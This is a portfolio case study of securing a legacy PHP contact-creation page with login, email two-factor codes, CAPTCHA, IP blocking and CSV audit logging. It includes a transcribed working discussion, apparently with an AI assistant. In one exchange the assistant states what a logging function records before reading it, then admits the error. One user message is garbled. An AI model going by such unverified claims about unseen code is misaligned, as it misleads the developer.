---
outline: [2, 3]
pageClass: contact-create-case
---

<script setup>
import { withBase } from 'vitepress'
import { onBeforeUnmount, ref } from 'vue'

const screenshotDialog = ref(null)
const screenshotTrigger = ref(null)
const activeScreenshot = ref({
  src: '',
  alt: '',
  caption: '',
  width: 0,
  height: 0,
})

function openScreenshot(event, caption) {
  const dialog = screenshotDialog.value
  const image = event.currentTarget?.querySelector('img')

  if (!dialog || !image || typeof dialog.showModal !== 'function') {
    return
  }

  event.preventDefault()
  screenshotTrigger.value = event.currentTarget
  activeScreenshot.value = {
    src: image.currentSrc || image.src,
    alt: image.alt || '',
    caption,
    width: image.naturalWidth,
    height: image.naturalHeight,
  }

  if (!dialog.open) {
    dialog.showModal()
    document.documentElement.classList.add('case-lightbox-open')
  }
}

function closeScreenshot() {
  screenshotDialog.value?.close()
}

function handleLightboxClick(event) {
  if (event.target === event.currentTarget) {
    closeScreenshot()
  }
}

function handleLightboxClose() {
  document.documentElement.classList.remove('case-lightbox-open')
  const trigger = screenshotTrigger.value
  screenshotTrigger.value = null
  requestAnimationFrame(() => trigger?.focus({ preventScroll: true }))
}

onBeforeUnmount(() => {
  document.documentElement.classList.remove('case-lightbox-open')
})
</script>

# Securing the `/contact/create` Page

<div class="case-tech-badges">
  <Badge type="tip" text="PHP" />
  <Badge type="warning" text="Bitrix24 REST API" />
  <Badge type="info" text="Security & QA" />
</div>

::: info 📋 Project Overview

| Parameter | Value |
|---|---|
| **Stack** | PHP, HTML, JavaScript, JSON, CSV, Bitrix24 REST API, Yandex SmartCaptcha, PHPMailer |
| **Timeline** | March 30–April 3, 2026 — first version on the test environment · April 8 — fully operational production solution |
| **Role** | Technical lead responsible for all coding and implementation |
| **Key files** | `contact/create.php`, `contact/process.php`, `contact/login/index.php`, `contact/login/functions.php`, `contact/login/lib/csv_logger.php`, `contact/login/lib/bitrix_company.php` |
| **QA** | 152 manual test cases · 88 marked Pass · 0 marked Fail · 11 marked Skip · 53 unmarked |
| **Website** | 🔗 [example.com/contact/create/](https://example.com/contact/create/) |
| **Result** | The `/contact/create` page is protected by authentication; anonymous access is impossible |

:::

## 📌 Project Overview and Technical Specification

Four improvements were required to strengthen the security of `https://example.com/contact/create`.

1. Register all users who submit data (taxpayer identification number (INN), tax registration reason code (KPP), etc.) → Log the data entered through the form and its transfer to Bitrix24.
2. Two-factor authentication → Implement Yandex ID authentication for all users.
3. Limit password-entry attempts and temporarily block offenders → Implement the mechanism and add notifications about blocking events.
4. Every change must affect this page only and must never interfere with the rest of the website or its functionality.

::: warning Public Version
The original wording has been preserved. Sensitive values have been replaced with demonstration data: participant names, environment and integration addresses, identifiers, organization details, webhook/token values, email addresses, and local links. A sanitized completed DOCX report is available in the QA section.
:::

## 📋 Complete Register of Project Engineering Tasks (`.tasks`)

::: details 📋 View the complete list of project stages and goals

### 🚀 Completed Development Tasks (`.tasks/done/`)

#### 000.1 — Sprint 1 — Password Authentication (Without 2FA) <Badge type="tip" text="Done" />
> **Goal:** Protect the `/contact/create` page with basic authentication (username + password). After this sprint, anonymous access to the page is impossible.

#### 000.2 — Sprint 2 — Authentication Logging <Badge type="tip" text="Done" />
> **Goal:** Record every login attempt, successful or unsuccessful, in a log file for auditing and debugging.

#### 000.3 — Sprint 3 — IP Blocking After Failed Attempts <Badge type="tip" text="Done" />
> **Goal:** Protect against brute force attacks: if one IP makes more than five failed attempts within ten minutes, block it for 30 minutes and send a notification.

#### 000.4 — Sprint 4 — Form Submission Logging <Badge type="tip" text="Done" />
> **Goal:** Know exactly which authenticated user sent which data to Bitrix24 and when.

#### 000.4.1 — Sprint 4.1 — Standardizing CSV Logging in `/contact` <Badge type="tip" text="Done" />
> **Goal:** Bring all CSV logs within `/contact` under one writing mechanism so authentication, IP blocking, and form-submission logging use a shared secure function based on `csv-log-template.php`.

#### 000.5 — Sprint 5 — Email Two-Factor Authentication (Single Page) <Badge type="tip" text="Done" />
> **Goal:** Add a second authentication factor using a one-time code sent by email. The code is sent to the address matching the user's login, so no additional email field is required. All 2FA logic is implemented directly on `index.php`, without creating a separate page.

#### 000.6 — Sprint 6 — Add Yandex SmartCaptcha to the Login Form <Badge type="tip" text="Done" />
> **Goal:** Reuse the CAPTCHA already present on the submission form for authentication, making automated attacks harder.

#### 000.6.1 — Sprint 6.1 — Log CAPTCHA Failures and Record the Attacking IP <Badge type="tip" text="Done" />
> **Goal:** Preserve an audit trail of login attempts rejected before password verification because Yandex SmartCaptcha is missing or invalid. These attempts must be written to `auth.csv`, count toward the rate limit, and automatically create an entry in `attacks.csv` when the threshold is reached.

#### 000.7 — Sprint 7 — Fully Isolate the Solution in the `contact` Directory <Badge type="tip" text="Done" />
> **Goal:** Turn `contact/` into a fully self-contained module that can be moved to any server as a unit, with no dependency on `php/`. All `formXXXXXXXX` processing, email notification, Bitrix24 integration, and logging logic must reside within `contact/` and use its own library copies.

#### 001 — Check for Duplicate Bitrix CRM Companies by INN <Badge type="tip" text="Done" />
> **Goal:** When a company is selected from DaData, automatically check Bitrix CRM for that company by INN. If a duplicate is found, show a warning with the company ID and link. The check runs in real time through AJAX, without reloading the page.

#### 002 — Duplicate Check: Account for KPP When Handling Branches <Badge type="tip" text="Done" />
> **Goal:** Allow company branches to be added to Bitrix CRM. The current duplicate check compares only INN, so a branch with the same INN but a different KPP is blocked. The INN+KPP pair must be considered: if the CRM already contains a company with the same INN but a different KPP, it is a branch and adding it must be allowed.

### 📌 Planned Backlog

#### 000.5.1 — Two-Factor Authentication (TOTP / Yandex Key) (Optional) <Badge type="warning" text="Backlog" />
> **Goal:** Add an alternative 2FA method through a TOTP application (Yandex Key, Google Authenticator, and others). This extends the mechanism created in Sprint 5.

#### 000.8 — Update the Header and Footer <Badge type="warning" text="Backlog" />
> **Goal:** Bring the header and footer of `/contact/create` in line with the main page, `pageYYYYYYY.html`.

#### 000.9 — Administration Utilities <Badge type="warning" text="Backlog" />
> **Goal:** Simplify user management for the administrator.

:::

## 💡 Example of the Most Complex Task

::: info 🧱 Sprint 7 — Fully Isolate the Solution in the `contact` Directory

> **Goal:** Turn `contact/` into a fully self-contained module that can be moved to any server as a unit, with no dependency on `php/`. All `formXXXXXXXX` processing, email notification, Bitrix24 integration, and logging logic must reside within `contact/` and use its own library copies.
>
> **Constraint:** **Only** the `formXXXXXXXX` case (the `/contact/create` form) is affected. The site's other approximately 25 forms continue to operate through `php/forms.php` unchanged.

The complete scope of work for items 7.1–7.15, including files, pitfalls, and the DoD, is preserved below in the full `ROADMAP.md`.

:::

## ⚡ Technical Solutions and Key Challenges

::: warning Problem: Isolating the Legacy Form
The task called for work in an isolated directory, but there were more actual dependencies on `php/` than expected.
:::

::: tip 💡 Solution
A fully standalone `contact/process.php` was created with its own copies of all security functions (`sanitizeInput`, `detectInjection`, `validateFields`, `checkRateLimit`), email transport (`mailer.php` plus a local PHPMailer copy), and Bitrix integration (`bitrix_company.php`). The form now sends POST requests to `/contact/process.php` instead of `/procces/`.
:::

::: warning Problem: Branches Were Identified as Duplicates
The duplicate check currently compares only INN, so a branch with the same INN but a different KPP is blocked.
:::

::: tip 💡 Solution
The INN+KPP pair must be considered: if the CRM already contains a company with the same INN but a different KPP, it is a branch and adding it must be allowed.
:::

## 🖼️ Interface and Key States

The public screenshot copies have been sanitized to remove real company details and CRM identifiers. Select an image to open it at full size.

### Authentication

<div class="case-screenshot-grid case-screenshot-grid--auth">
  <figure class="case-screenshot-card">
    <a class="case-screenshot-card__media" :href="withBase('/images/contact-create-page/login.png')" @click="openScreenshot($event, 'Sign in to the protected area')">
      <img :src="withBase('/images/contact-create-page/login.png')" alt="Protected-area login form with username, password, and Yandex SmartCaptcha" width="602" height="612" loading="lazy">
    </a>
    <figcaption>
      <strong>Sign in to the protected area</strong>
      <span>Username, password, and Yandex SmartCaptcha are required before accessing the form.</span>
    </figcaption>
  </figure>
  <figure class="case-screenshot-card">
    <a class="case-screenshot-card__media" :href="withBase('/images/contact-create-page/two-factor-authentication.png')" @click="openScreenshot($event, 'Second factor')">
      <img :src="withBase('/images/contact-create-page/two-factor-authentication.png')" alt="Form for entering a six-digit two-factor authentication code" width="503" height="657" loading="lazy">
    </a>
    <figcaption>
      <strong>Second factor</strong>
      <span>Email code, resend timer, and separate sign-in confirmation.</span>
    </figcaption>
  </figure>
</div>

### Duplicate Check and Form Submission

<div class="case-screenshot-grid case-screenshot-grid--states">
  <figure class="case-screenshot-card">
    <a class="case-screenshot-card__media" :href="withBase('/images/contact-create-page/duplicate-found.png')" @click="openScreenshot($event, 'Duplicate found')">
      <img :src="withBase('/images/contact-create-page/duplicate-found.png')" alt="Warning that a duplicate Bitrix CRM company was found" width="779" height="587" loading="lazy">
    </a>
    <figcaption>
      <strong>Duplicate found</strong>
      <span>A link to the existing CRM record, with submission blocked.</span>
    </figcaption>
  </figure>
  <figure class="case-screenshot-card">
    <a class="case-screenshot-card__media" :href="withBase('/images/contact-create-page/duplicate-check-unavailable.png')" @click="openScreenshot($event, 'Check unavailable')">
      <img :src="withBase('/images/contact-create-page/duplicate-check-unavailable.png')" alt="Message that the duplicate check is unavailable, with an option to continue" width="787" height="468" loading="lazy">
    </a>
    <figcaption>
      <strong>Check unavailable</strong>
      <span>Fail-open scenario: the user can explicitly continue without the check.</span>
    </figcaption>
  </figure>
  <figure class="case-screenshot-card">
    <a class="case-screenshot-card__media" :href="withBase('/images/contact-create-page/crm-error.png')" @click="openScreenshot($event, 'Bitrix CRM error')">
      <img :src="withBase('/images/contact-create-page/crm-error.png')" alt="Error message shown when a Bitrix CRM company cannot be created" width="767" height="424" loading="lazy">
    </a>
    <figcaption>
      <strong>Bitrix CRM error</strong>
      <span>A clear user-facing message with no internal technical details.</span>
    </figcaption>
  </figure>
  <figure class="case-screenshot-card">
    <a class="case-screenshot-card__media" :href="withBase('/images/contact-create-page/submission-success.png')" @click="openScreenshot($event, 'Successful submission')">
      <img :src="withBase('/images/contact-create-page/submission-success.png')" alt="Successful form submission with a link to the newly created Bitrix CRM record" width="787" height="450" loading="lazy">
    </a>
    <figcaption>
      <strong>Successful submission</strong>
      <span>After the company is created, the user receives a direct link to its CRM record.</span>
    </figcaption>
  </figure>
</div>

<dialog
  ref="screenshotDialog"
  class="case-lightbox"
  aria-label="Enlarged interface screenshot"
  aria-describedby="case-lightbox-caption"
  @click="handleLightboxClick"
  @close="handleLightboxClose"
>
  <button class="case-lightbox__close" type="button" aria-label="Close enlarged image" @click="closeScreenshot"><SolarIcon name="cross" :stroke-width="2" /></button>
  <figure class="case-lightbox__figure">
    <img
      :src="activeScreenshot.src"
      :alt="activeScreenshot.alt"
      :width="activeScreenshot.width"
      :height="activeScreenshot.height"
    >
    <figcaption id="case-lightbox-caption">{{ activeScreenshot.caption }}</figcaption>
  </figure>
</dialog>

## 📈 Final Results

::: tip 🏆 QA Based on the Completed Report

The totals were calculated from the marks in each row of the `QA_Report_Contact_Create_Pass.docx` table. The original “Test Run Summary” field below has been preserved without correction.

| Metric | Value |
|---|---:|
| Total test cases | 152 |
| Marked Pass | 88 |
| Marked Fail | 0 |
| Marked Skip | 11 |
| No status marked | 53 |

:::

::: tip 🏆 Final Report

* The `/contact/create` page is protected by authentication; anonymous access is impossible
* Two-factor authentication using a one-time email code has been added
* Brute force protection blocks an IP after failed login attempts
* Yandex SmartCaptcha has been added to the login form to filter out automated password-guessing attacks
* Every login attempt and block is recorded in audit files
* Every form submission is logged with the user, company data, and CRM response
* The form is isolated in a self-contained module independent of the rest of the website
* A real-time duplicate check by INN has been implemented; if the company already exists in Bitrix CRM, a warning appears with a link to its record
* After a successful submission, a link to the created company record is displayed, improving the user experience

:::

## 🗂️ Complete Implementation Sequence and All Source Materials

Below is the complete content of all 11 published `.tasks` materials in implementation order. The text has not been abridged; only formatting and the sensitive values listed above have been changed.

::: info 🧭 Materials Map

| Section | Source | Contents |
|:---:|---|---|
| **1** | `TASK.md` | Original brief and working discussion |
| **2** | `ROADMAP.md` | Sprints, dependencies, files, and DoD |
| **3** | `csv-log-template.php` | Reference implementation of secure CSV logging |
| **4** | `QA_TESTCASES.md` | Complete set of 152 manual test cases |
| **5** | `QA_Report_Contact_Create_Pass.docx` | Completed QA report for download |
| **6** | `analysis.md` | Analysis of duplicate-check approaches |
| **7** | `task.md` | Implementing the check by INN |
| **8** | `popup.html` | UI prototype for the duplicate warning |
| **9** | `002-duplicate-kpp-branch/task.md` | KPP handling for branches |
| **10** | `REPORT.md` | Final report, deployment, and notification |
| **11** | `_template.md` | Internal engineering task template |

:::

## 1. Original Brief and Task Analysis <Badge type="info" text="TASK.md" />



::: details 📄 Open the original brief and working discussion

<div class="case-source-path"><span>Source</span><code>.tasks/done/000-auth-logs-2fa/TASK.md</code></div>

#### Description:

Four improvements are required to strengthen the security of https://example.com/contact/create

##### Assignees:

- Developer — technical lead responsible for all coding and implementation
- QA engineer — testing, preparing instructions and publishing information to production, and configuring users

##### Responsibilities:

###### Developer:

Implement every item in the implementation plan below, taking the technical constraints into account. Send me all code for review before publishing it to production. Show me the first working version, fully functional on the test environment, no later than April 3, 2026.

###### QA Engineer:

Fully test the implemented functionality. Prepare “How to Sign In to the Website” instructions that account for the new 2FA through Yandex ID. Prepare and publish all necessary user information in production. Configure and notify every user who needs access. (I will provide the user list later.)

##### Technical Constraints and Implementation Requirements:

- The https://example.com/contact/create page is legacy code; take that into account
- Every change must affect this page only and must never interfere with the rest of the website or its functionality.
- Solutions must be as simple and concise as possible.
- Databases, additional modules, and any add-ons are prohibited. The implementation must remain minimal, easy to maintain, and controlled through a configuration file.

##### Task

1. Register all users who submit data (INN, KPP, etc.) → Log the data entered through the form and its transfer to Bitrix24.
2. Two-factor authentication → Implement Yandex ID authentication for all users.
3. Limit password-entry attempts and temporarily block offenders → Implement the mechanism and add notifications about blocking events.

##### Solution Architecture

###### Concept and Constraints

- Isolation: The solution must operate as a separate module (directory) without affecting the legacy website core.
- Data storage: Because there is no primary database, use SQLite. Alternatively, store users and password hashes in a file (something like `users.json` is more logical and easier to read and edit). MySQL/PostgreSQL are prohibited in this implementation.
- Sessions: Use native PHP sessions (`$_SESSION`) with hardened security settings. (For now, retain sessions for 30 days.)
- 2FA (two-factor authentication): Username + password + 2FA code
- Mandatory: Prevent direct access to system files in the implementation directory.

###### File Structure

A separate directory, such as `/secure-area/`. Access to it must be restricted with file-system permissions.

Approximate file structure:

- config.php
- `init.php` (sessions, users from a database or file, autoloading)
- Login page (authentication)
- Two-factor authentication verification logic

###### Authentication Logic

1. The user enters a username and password.
2. The system verifies the password hash.
3. If it is correct and 2FA is enabled for the user, proceed to the code-entry step (intermediate `auth_step_2` session).
4. The user enters a code from the Yandex ID application (this application only!).
5. If the code is valid -> Create the main session -> Redirect to the page.

###### Security and Logging

Create a log, for example `logs/auth.log`, outside public access. Record: time, IP, User-Agent, username, and result (success/failure). Follow the logging examples previously used on support, example.com, and learning.

Also log which user sends which data to Bitrix.

Implement basic protection on the login page: if one IP makes more than five failed attempts within ten minutes, block that IP for 30 minutes.

###### Checkpoints (Meetings):

- Wednesday, April 1, 2026, at 15:00 — interim meeting (current progress demonstration)
- Friday, April 3, 2026, at 14:00 — demonstration of the first fully working version on the test environment.

###### First-Phase Timeline:

- March 30–April 3, 2026 (the first version on the test environment must be shown to me).
- April 8 — fully operational production solution

#### 💬 Working Discussion of the Brief

##### 👤 Question

> I was assigned this task, but I do not understand what needs to be done. It seems to explain how to do it, but the specifics are unclear:

##### 💬 Answer · March 30

I understand. Let us break it down in plain language.

The core issue is that the contact creation page on example.com is currently open to everyone. It needs protection so that only authenticated users can access it.

Four specific things need to be done:

1. Logging — record who submitted which data through the form, when they submitted it, and what was sent to Bitrix24.

2. Two-factor authentication (2FA) — before accessing the page, the user must sign in with a username, password, and a code from the Yandex ID application.

3. Brute force protection — if someone enters the wrong password five times within ten minutes, their IP is blocked for 30 minutes and a notification is sent.

4. Separate module — all of this is implemented in a separate `/secure-area/` directory without touching the rest of the website.

What YOU, the developer, specifically need to do:

Write PHP code in `/secure-area/`:

`config.php` — user list and settings
`init.php` — session startup and user loading
Login page (username/password form)
2FA code verification (Yandex ID uses TOTP, a standard protocol)
IP-blocking logic
Logs in `logs/auth.log`
Store users and their password hashes in `users.json`. No database is needed.

The nearest deadline is April 3, so a working version must be ready on the test environment in four days.

What exactly is unclear: the PHP implementation itself, or something else?

##### 👤 Message

> Cockery distrusts the police on Telemonitor, such as Letter or Brunch, no.

##### 💬 Answer · March 30

Sorry

##### 👤 Question

> How will users be registered? Manually, or is that not specified here?

##### 💬 Answer · March 30

According to the document, manually through the configuration file.

Here is a quote from the task:

“Controlled through a configuration file”
“Store users in a file with password hashes (something like `users.json` makes more sense and will be easier to read and edit)”

In other words, there is no registration form. The administrator adds users manually by opening `users.json` and entering a new user.

This makes sense because:

The user list is small and fixed (the QA engineer will receive the list at the end and configure everyone)
Self-registration on such a protected page would create a security hole
The goal is to protect access, not build a public service
One point should be clarified: how exactly should a password be added to `users.json`? A small utility or command will probably be needed to generate the hash so that the QA engineer does not have to edit PHP manually. Ask the task owner about this, or create a simple `add_user.php` script for it.

##### 👤 Question

> Okay, understood. Architecturally, do we need to move the current page into that directory too? Or can it stay where it is? How will access to it be granted—through a cookie or something else? I have not done this before, so I do not fully understand the mechanics.

##### 💬 Answer · March 30

Good question. Let me explain how it works.

The page does not need to be moved; it stays where it is. The flow is as follows:

How it works with a session:

The user opens `/contact/create`
        ↓
PHP checks whether an active session exists
        ↓
NO → redirect to `/secure-area/index.php`
        ↓
The user enters a username, password, and 2FA code
        ↓
Success → PHP sets `$_SESSION['authenticated'] = true`
        ↓
Redirect back to `/contact/create`
        ↓
The session now exists → the page opens
Technically, only a few lines are added to the beginning of the current `/contact/create` page:

```php
require_once '/secure-area/init.php';

if (!isset($_SESSION['authenticated'])) {
    header('Location: /secure-area/index.php');
    exit;
}
```

That is the entire connection. The session ID is stored in a browser cookie (PHP handles this automatically), while the data itself is stored on the server.

In summary:

The `/contact/create` page stays in place; you add only three lines at the beginning
All login logic resides in `/secure-area/`
The session lasts 30 days, as specified in the task
This is a standard, straightforward mechanism; there is nothing complicated about it.

##### 👤 Question

> What if my current page is HTML? Can I add that PHP line to it, or how would that work?

##### 💬 Answer · March 30

Good question. If the page is plain `.html`, PHP cannot be added to it because the server does not execute HTML as PHP.

Possible solutions:

Option 1 — rename the file (the simplest approach)

contact-create.html → contact-create.php
Everything inside remains as it was; simply add the PHP check at the beginning. Most servers will handle this without any problem.

Option 2 — use `.htaccess` (if the file cannot be changed at all)

Create a separate PHP wrapper that checks the session and then includes the HTML:

```php
&lt;?php
require_once '/secure-area/init.php';
if (!isset($_SESSION['authenticated'])) {
    header('Location: /secure-area/index.php');
    exit;
}
include 'contact-create.html';
```

Then use `.htaccess` to redirect the request to this file.

Option 3 — nginx/Apache configuration

At the server level, every request to `/contact/create` first passes through the PHP check.

What you should do:

First determine whether it is really an `.html` file or legacy PHP that outputs HTML. The task says “legacy code,” so it is probably old PHP. Check the file extension on the server.

##### 👤 Question

> What will I need to test all of this besides access to the server and this page? Will I need access to other services?

##### 💬 Answer · March 30

Yes. You will need the following:

Required:

Server access (already available)
Access to `/contact/create` (already available)
Yandex ID — an application must be registered in Yandex OAuth to obtain the `client_id` and `client_secret` for 2FA
For testing 2FA:

The Yandex Key application on a phone (their TOTP application, similar to Google Authenticator)
Or any TOTP generator to verify that the codes work
For testing Bitrix24 logs:

Access to Bitrix24, or at least the webhook URL, to confirm that form data actually reaches it
For testing IP blocking:

A VPN or multiple devices to simulate failed attempts and confirm that blocking is triggered
Or temporarily change the threshold in `config.php` to two attempts
Clarify the following with the task owner:

Does a Yandex OAuth application already exist, or must a new one be created?
Which Bitrix24 webhook/token should be used for logging?
These two issues could block progress, so it is best to obtain the answers in advance.


##### 📎 Attachment · HTML Fragment

```html
&lt;!DOCTYPE html&gt; &lt;html lang="ru"&gt; &lt;head&gt; &lt;meta charset="utf-8" /&gt; &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0" /&gt; &lt;!--metatextblock--&gt; &lt;title&gt;Создание контакта в Zendesk Sell&lt;/title&gt; &lt;meta name="description
```

##### 👤 Question

> Here is that page, https://example.com/contact/create. Please look at what happens after the “Submit” button is pressed: where the data goes, which data is sent, and how.

##### 💬 Answer · March 30

All right, I analyzed the source. Here is what happens when “Submit” is pressed:

The page is built with Tilda. It is neither plain HTML nor PHP, but a page created in the Tilda website builder and exported to the hosting server.

What happens when the form is submitted:

The form (`form#formXXXXXXXX`) sends data through Tilda Forms, Tilda's own system. This is evident from:

`data-formactiontype="2"` — the Tilda processing type
`data-tilda-formskey="..."` — the project key
The data goes to Tilda's servers, which then distribute it to connected integrations through `formservices[]`. Six services are connected to the form (six hidden inputs with hash values); these may include email notifications, Bitrix24, a CRM, and so on.

What DaData fills in automatically:

DaData, a suggestion service, is connected to the company-name input. When a user selects a company from the list, the script automatically fills hidden fields: INN, KPP, OGRN, address, OKVED, director, founders, and so on.

The key conclusion for your task:

This significantly complicates the task. Because the page is on Tilda, you cannot simply add PHP at the beginning of the file. Tilda has its own form processing system, so standard PHP cannot directly intercept data submission at the server level.

Possible solutions:

Ask the task owner whether the page was exported from Tilda to the hosting server, meaning its files reside on the server, or whether it remains on Tilda's servers and is merely proxied. This distinction is crucial because the entire solution architecture depends on it.

##### 👤 Clarification

> It is not exactly Tilda. It is legacy code: it used to be on Tilda, then it was downloaded, and now it is just static content on our server. The HTML page is currently in the root directory. I also think the forms no longer submit to Tilda's servers; we seem to have custom handlers there.

##### 💬 Answer · March 30

Excellent. That changes the situation for the better; everything is implementable.

Before starting, find the custom form handler on the server. It is most likely a PHP file that receives the form's POST request. Look for something like:

/form-handler.php
/api/form.php
/contact/handler.php
Alternatively, inspect the HTML itself. The `&lt;form&gt;` tag has an empty `action=''` attribute, but JavaScript may override the request destination. Check the included JavaScript files, especially `tilda-forms-1.0.min.js` and `tilda-zero-forms-1.0.min.js`; the submission logic should be there.

Once you find the handler, the plan is:

The user opens `/contact/create` (HTML)
        ↓
`.htaccess` intercepts the request
        ↓
The PHP file checks the session
        ↓
No session → redirect to the login page
        ↓
Session exists → serve the HTML page to the user
Data logging is added to the form handler: write a log entry there before the data is sent to Bitrix.

Find the handler, and then it will be possible to say exactly how the code should be written.


##### 📎 Attachment · `tilda-forms-1.0.min.js` (Fragment)

```javascript
var FORMS_API_FIELD = { EMAIL: "em", PHONE: "ph", NAME: "nm", CONTACT_METHOD: "contact_method", INPUT: "in", TEXTAREA: "ta", DATE: "da", TEXT: "tx", URL: "ur", HIDDEN: "hd", SELECT: "sb", TIME: "tm", VARIANTS: "rd", IMAGE_VARIANTS
```

##### 📎 Attachment · `tilda-zero-forms-1.0.min.js` (Fragment)

```javascript
if(window.t_zeroForms__browserLang=(window.navigator.userLanguage||window.navigator.language).toUpperCase().slice(0,2),window.t_zeroForms__isMobile=/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),window.t_zeroForms__isSafari=/^((?!chrome|android).)*safari/i
```

##### 👤 Clarification

> Here are the JavaScript files you mentioned:

`tilda-forms-1.0.min.js` and `tilda-zero-forms-1.0.min.js`

##### 💬 Answer · March 30

Excellent. The picture is now complete. I found the most important part of the code:

```javascript
// Было оригинально:
// var formUrl = "https://" + window.tildaForm.endpoint + "/procces/"

// Стало (кастомная правка):
var formUrl = "/procces/", dataForm = [], arrFilter = [];
```

**This is the custom handler.** The form sends a POST request to `/procces/`, which means the server has a `/procces/index.php` file or something similar that receives the data and passes it to Bitrix.

---

**The task architecture is now fully understood:**

```text
User → /contact/create (HTML)
                     ↓ presses "Submit"
              POST → /procces/  (PHP handler)
                     ↓
                  Bitrix24
```
What needs to be done:

First, find `/procces/` on the server; that is where the PHP handler resides. This is the top priority because data logging must be added there, and the session check must be placed before it.

Check whether it contains `index.php`, `handler.php`, or something similar. Once you find it, show it to me and we can write specific code.


##### 📎 Attachment · File List from `php/`

| File | Type | Size |
|---|:---:|---:|
| `forms.php` | PHP | — |
| `ip_rate_limits.json` | JSON | 1 line |
| `request.php` | PHP | 78 lines |
| `special.php` | PHP | 78 lines |
| `bessrochnye-licenzii.php` | PHP | 74 lines |
| `company.php` | PHP | 62 lines |
| `download-personal.php` | PHP | 62 lines |
| `for-ai.php` | PHP | 73 lines |
| `for-ai-1.php` | PHP | 65 lines |
| `for-business.php` | PHP | 67 lines |
| `index.php` | PHP | 45 lines |
| `leadadd2.php` | PHP | 76 lines |

##### 👤 Question

> Here are several files from the `php` directory. Please see whether they contain what you were talking about.

##### 💬 Answer · March 30

Excellent. Everything is now completely clear. Here is what I see:

Handler structure:

This is the `/procces/` directory, or an equivalent one, containing PHP handlers for different forms. The `/contact/create` page most likely uses `company.php`: it sends `crm.company.add` with the `company`, `inn`, `kpp`, `ogrn`, `address`, `okved`, and other fields. This exactly matches the data the page's form collects through DaData.

You now have everything needed to implement the task. The final plan is:

1. Logging — add it to `company.php` at two points: before sending data to Bitrix, to record what arrived from the form, and afterward, to record Bitrix's response.

2. Page protection (2FA + session) — create `/secure-area/` with login and TOTP-code verification through Yandex Key, then add a PHP session check before the `/contact/create` HTML page using `.htaccess` or by renaming the file.

3. Brute force protection — `ip_rate_limits.json` already exists, so the mechanism has partly been planned. Complete it and connect it to the login page.

Clarify one point: determine exactly which file serves `/contact/create`. Check `.htaccess` or `forms.php` to see exactly where the POST request from this page goes. Can you show `forms.php`? Its name suggests that it may be the router that decides which handler to invoke.


##### 📎 Attachment · `.htaccess` and `forms.php`

```apache
ErrorDocument 403 /pageXXXXXXX.html ErrorDocument 404 /pageXXXXXXX.html DirectoryIndex pageYYYYYYY.html RewriteEngine On RewriteCond %{HTTP:X-Forwarded-Proto} =http RewriteRule ^(.*)$ https://example.com/$1 [R=301,L] RewriteCond %{HTTP:X-Forwarded-Proto} =https RewriteCond
```

##### 👤 Clarification

> Here are `.htaccess` and `forms.php`.

##### 💬 Answer · March 30

The picture is now completely clear. Here are the key lines from `.htaccess`:

```apache
RewriteRule ^procces/$ php/forms.php [NC]
RewriteRule ^contact/create$ pageZZZZZZZ.html [NC]
```

Therefore, the architecture is:

The page is `pageZZZZZZZ.html`, the same HTML you showed earlier
The form sends a POST request to `/procces/`, which reaches `php/forms.php`
Now we need to inspect `forms.php` itself. It is most likely a router that decides which handler (`company.php`, `request.php`, and so on) receives the data. You uploaded it, but its contents were not shown. Please show what is inside `forms.php`.

After that, specific code can be written for all four tasks at once because every other piece is already available.


##### 📎 Attachment · `forms.php`

```text
forms.php (PHP)
```

##### 👤 Clarification

> Here it is. I just sent it—for the third time already.

##### 💬 Answer · March 30

Sorry. I can see that the file was uploaded, but only its path appeared in our conversation, not its contents. Let me read it directly.


##### ⚙️ System Action

Reading the contents of `forms.php`.

Everything is now completely clear. I found the most important part:

```php
case "formXXXXXXXX": // ссылка /contact/create
    // Проверка капчи — только для этой формы
    require 'bitrix/company.php';
    logFormData($_POST);
```

The complete system picture is therefore:

`forms.php` is the central router and is already very well written, with validation, rate limiting, logging, and injection protection
The `/contact/create` form → `formXXXXXXXX` → `bitrix/company.php` → Bitrix24
Logging already exists in part through `logFormData()`, but only for basic fields (name, email, phone)
What specifically remains to be done for your task:

1. Bitrix data logging — in the `formXXXXXXXX` case, add an extended log containing INN, KPP, OKVED, and the Bitrix response. Currently, `$response` in `company.php` is not written anywhere.

2. 2FA + page protection — create `/secure-area/` with login and TOTP, and add a session check in `.htaccess` before serving `pageZZZZZZZ.html`.

3. Brute force protection on the login page — `checkRateLimit()` is already implemented and working; simply connect it to the login page.

4. Blocking notifications — `sendEmails()` already exists; simply call it when a block occurs.

I am ready to start writing code. Which should we begin with: 2FA or logging?

##### 👤 Question

> Regarding `logFormData($_POST);`, how did you determine that it contains only the name, email, and phone number? I do not think we even have those fields.

##### 💬 Answer · March 30

You are right; sorry, I was not paying close enough attention. Let me inspect `logFormData` carefully.


##### ⚙️ System Action

Reading the `logFormData` function.

I now see the complete picture. `logFormData` is a generic function for all forms. It writes only common fields: date, form name, ID, name, email, phone, IP, URL, and consent.

This is not particularly suitable for `/contact/create` (`formXXXXXXXX`), which has no name, email, or phone fields. Its primary fields are `company`, `inn`, `kpp`, `ogrn`, `okved`, `address`, and so on.

This means the form currently produces an almost empty log row: all fields will be `N/A`.

What needs to be done for the task:

Add a separate specialized log in the `formXXXXXXXX` case. After `require 'bitrix/company.php'`, call a new `logCompanyFormData($_POST, $response)` function that writes the required fields: company, INN, KPP, OGRN, OKVED, address, and the Bitrix response.

Should I write the code?

##### 👤 Request

> Wait. Give me a complete summary of what you currently understand about this task. We will move to another chat and continue there.

##### 💬 Answer · March 30

Complete Summary of the `/contact/create` Task

Stack and Architecture

The website was formerly hosted on Tilda and was exported to its own server as static files. Routing is handled through `.htaccess`.

`/contact/create` → `pageZZZZZZZ.html` (static HTML, form ID `formXXXXXXXX`)
`/procces/` → `php/forms.php` (central router for all forms)
When the form is submitted, JavaScript sends a POST request to `/procces/`. `forms.php` inspects `tildaspec-formid`, finds the `formXXXXXXXX` case, and runs `require 'bitrix/company.php'`. That file sends the data to Bitrix24 through the REST API (`crm.company.add`).

Data Collected by the Form (Through DaData)

The user enters a company name, and DaData automatically populates the hidden fields: `company`, `inn`, `kpp`, `ogrn`, `address`, `okved`, `opf`, `registration_date`, `employee_count`, `address_country`, `address_state`, and `address_city`. All of these fields are sent to Bitrix.

What Already Exists in `forms.php`

Field validation (`validateFields`)
Injection protection (`detectInjection`)
A rate limit of five requests per hour per IP (`checkRateLimit`), implemented through Memcached or `ip_rate_limits.json`
